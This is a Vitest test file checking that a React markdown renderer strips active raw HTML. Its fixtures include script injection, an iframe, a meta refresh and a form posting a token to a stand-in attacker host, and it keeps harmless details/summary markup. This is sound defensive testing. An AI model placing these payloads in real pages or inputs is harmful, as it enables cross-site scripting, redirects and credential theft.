// SPDX-License-Identifier: Apache-2.0
// Copyright (c) OpenBank contributors. Licensed under the Apache License, Version 2.0.

import { renderToStaticMarkup } from 'react-dom/server'
import { describe, expect, it } from 'vitest'
import { MarkdownView } from '@/components/docs/MarkdownView'

describe('MarkdownView active HTML boundary', () => {
  it('removes executable, navigating and embedded raw HTML', () => {
    const html = renderToStaticMarkup(<MarkdownView serviceName="ledger-service" markdown={`
<script>globalThis.pwned = true</script>
<iframe src="https://attacker.example/collect"></iframe>
<meta http-equiv="refresh" content="0;url=https://attacker.example/redirect">
<form action="https://attacker.example/collect"><input name="token"><button>Send</button></form>
<svg><script>alert(1)</script></svg>
`} />)

    expect(html).not.toContain('<script')
    expect(html).not.toContain('<iframe')
    expect(html).not.toContain('<meta')
    expect(html).not.toContain('<form')
    expect(html).not.toContain('<input')
    expect(html).not.toContain('<button')
    expect(html).not.toContain('<svg')
    expect(html).not.toContain('attacker.example')
    expect(html).not.toContain('globalThis.pwned')
  })

  it('preserves the presentational disclosure HTML used by existing ADRs', () => {
    const html = renderToStaticMarkup(<MarkdownView serviceName="adr" markdown={`
<details>
<summary>Original delivery note</summary>

Safe historical context.

</details>
`} />)

    expect(html).toContain('<details>')
    expect(html).toContain('<summary>Original delivery note</summary>')
    expect(html).toContain('Safe historical context.')
  })
})
